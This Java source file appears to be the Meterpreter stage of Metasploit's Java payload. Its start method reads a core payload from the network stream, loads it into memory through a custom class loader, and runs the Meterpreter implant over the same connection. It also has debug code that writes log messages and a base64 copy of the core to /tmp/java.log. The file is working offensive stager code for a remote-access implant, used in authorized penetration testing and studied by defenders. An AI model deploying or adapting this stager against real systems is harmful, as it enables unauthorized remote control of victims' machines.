package javapayload.stage;

import java.io.*;
import java.net.*;

import com.metasploit.meterpreter.MemoryBufferURLStreamHandlerFactory;

/**
 * Meterpreter Java Payload Proxy
 */
public class Meterpreter implements Stage {

    public static String b64(byte[] data)
    {
        char[] tbl = {
                'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
                'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
                'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
                'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/' };

        StringBuilder buffer = new StringBuilder();
        int pad = 0;
        for (int i = 0; i < data.length; i += 3) {

            int b = ((data[i] & 0xFF) << 16) & 0xFFFFFF;
            if (i + 1 < data.length) {
                b |= (data[i+1] & 0xFF) << 8;
            } else {
                pad++;
            }
            if (i + 2 < data.length) {
                b |= (data[i+2] & 0xFF);
            } else {
                pad++;
            }

            for (int j = 0; j < 4 - pad; j++) {
                int c = (b & 0xFC0000) >> 18;
                buffer.append(tbl[c]);
                b <<= 6;
            }
        }
        for (int j = 0; j < pad; j++) {
            buffer.append("=");
        }

        return buffer.toString();
    }


    public static void dprintf(String message) {
        FileWriter fileWriter = null;
        BufferedWriter bufferedWriter = null;
        PrintWriter printWriter = null;
        try {
            fileWriter = new FileWriter("/tmp/java.log", true);
            bufferedWriter = new BufferedWriter(fileWriter);
            printWriter = new PrintWriter(bufferedWriter);
            printWriter.println(message);
            printWriter.close();
        } catch (IOException e) {
            // we failed, move on.
        } finally {
            if (printWriter != null) {
                printWriter.close();
            }

            try {
                if (bufferedWriter != null) {
                    bufferedWriter.close();
                }
            } catch (IOException e) {
                // we failed, move on.
            }

            try {
                if (fileWriter != null) {
                    fileWriter.close();
                }
            } catch (IOException e) {
                // we failed, move on.
            }
        }
    }

    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        dprintf("Meterpreter starting");
        boolean noRedirectError = parameters[parameters.length - 1].equals("NoRedirect");
        int coreLen = in.readInt();
        dprintf("Reading coreLen " + coreLen);
        byte[] core = new byte[coreLen];
        in.readFully(core);
        dprintf("testing");

        String encodedString = b64(core);
        dprintf(encodedString);
        URL coreURL = MemoryBufferURLStreamHandlerFactory.createURL(core, "text/lol");
        new URLClassLoader(new URL[]{coreURL}, getClass().getClassLoader(), MemoryBufferURLStreamHandlerFactory.getInstance()).loadClass("com.metasploit.meterpreter.Meterpreter").getConstructor(new Class[]{DataInputStream.class, OutputStream.class, boolean.class, boolean.class}).newInstance(in, out, Boolean.TRUE, Boolean.valueOf(!noRedirectError));
        in.close();
        out.close();
    }
}
